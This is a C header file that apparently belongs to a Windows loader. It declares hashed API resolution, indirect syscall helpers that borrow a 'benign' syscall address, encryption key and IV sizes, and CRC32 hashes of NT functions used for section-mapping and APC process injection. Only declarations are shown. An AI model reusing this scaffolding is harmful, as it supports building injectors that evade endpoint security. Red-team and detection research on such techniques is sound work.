#pragma once

#ifndef _COMMON_H
#define _COMMON_H

#include <Windows.h>
#include "Structs.h"

BOOL ResolveNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys);
HMODULE GetModuleHandleH(IN DWORD dwModuleNameHash);
FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD dwAPINameHash);
unsigned int crc32h(char* message);
extern VOID SetSSn(DWORD wSystemCall, DWORD64 wSyscallOpAddr);
extern ExecSyscall();

// comment out to suppress output
//\
#define _DBG

#ifdef _DBG 
#define DEBUG_PRINT(x, ...) printf(x, ##__VA_ARGS__)
#define _INT getchar()
#else
#define DEBUG_PRINT(x, ...)
#define _INT
#endif

#define KEYSIZE 32
#define IVSIZE 16

#define NtOpenProcess_CRC32 0xDBF381B5
#define NtQueryInformationProcess_CRC32 0xA5C44C50
#define NtCreateSection_CRC32 0x9EEE4B80
#define NtMapViewOfSection_CRC32 0xA4163EBC
#define NtUnmapViewOfSection_CRC32 0x90483FF6
#define NtCreateThreadEx_CRC32 0x2073465A
#define NtQueueApcThread_CRC32 0x235B0390
#define NtAlertResumeThread_CRC32 0xC66C6223

#define NtCreateFile_CRC32 0x3EE6CC56
#define NtOpenFile_CRC32 0xA1B1DC21
#define NtWriteFile_CRC32 0x3AFBE45B
#define NtLockFile_CRC32 0xA0115B88

#define ntdll_CRC32 0x84C05E40
#define RtlExitUserThread_CRC32 0x7714FA20

#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#define SET_LAST_NT_ERROR(s) SetLastError(s)

#define SET_SYSCALL(NtSys, Benign) (SetSSn((DWORD)NtSys.dwSSn, (PVOID)Benign.pSyscallOpAddr))
#define HASH(API) crc32h((char*)API)

#endif // !COMMON_H

